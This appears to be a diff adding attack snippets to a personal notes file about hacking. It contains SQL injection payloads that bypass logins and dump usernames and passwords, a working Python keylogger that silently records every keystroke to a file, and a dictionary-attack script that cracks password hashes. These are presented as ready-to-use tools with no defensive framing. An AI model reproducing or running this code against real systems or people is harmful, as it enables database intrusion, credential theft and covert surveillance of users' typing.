@@ -45,3 +45,56 @@ crate database
 goto xss
 
 
+1' OR '1'='1 --
+1' UNION SELECT user, password FROM users --
+
+Key logger code
+
+from pynput.keyboard import Key, Listener
+import logging
+log_dir = ""
+logging.basicConfig(
+    filename=(log_dir + "key_log.txt"),
+    level=logging.DEBUG,
+    format='%(asctime)s: %(message)s'
+)
+def on_press(key):
+    try:
+        logging.info(f'Key {key.char} pressed')
+    except AttributeError:
+        logging.info(f'Special key {key} pressed')
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+
+dictionary attack
+
+import hashlib
+
+# Step 1: Create a password
+original_password = "secure123"
+
+# Step 2: Hash the password using SHA-256
+def hash_password(password):
+    return hashlib.sha256(password.encode()).hexdigest()
+
+hashed_password = hash_password(original_password)
+print("Original password hashed (SHA-256):", hashed_password)
+
+# Step 3: Dictionary attack
+def dictionary_attack(hash_to_crack, dictionary_file):
+    try:
+        with open(dictionary_file, 'r') as file:
+            for line in file:
+                word = line.strip()
+                if hash_password(word) == hash_to_crack:
+                    return f"Password cracked! The password is: {word}"
+        return "Password not found in the dictionary."
+    except FileNotFoundError:
+        return f"File '{dictionary_file}' not found."
+
+# Run dictionary attack
+result = dictionary_attack(hashed_password, "dictionary.txt")
+print(result)
+
+
